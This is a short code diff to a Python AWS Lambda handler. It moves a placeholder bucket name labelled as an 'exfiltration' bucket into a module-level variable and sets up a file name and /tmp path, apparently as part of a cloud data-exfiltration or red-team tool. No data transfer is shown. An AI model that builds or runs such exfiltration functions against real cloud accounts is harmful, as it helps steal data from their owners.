@@ -1,9 +1,12 @@
 import json
 import boto3
+
+exfiltration_bucket_name = "<EXFILTRATION_BUCKET_NAME>" 
+
 def lambda_handler(event, context):
 
     #Enviroment setup
-    bucket_name = "<EXFILTRATION_BUCKET_NAME>"
+    bucket_name = exfiltration_bucket_name
     file_name = event["fileName"] + ".txt"
     
     lambda_path = "/tmp/" + file_name
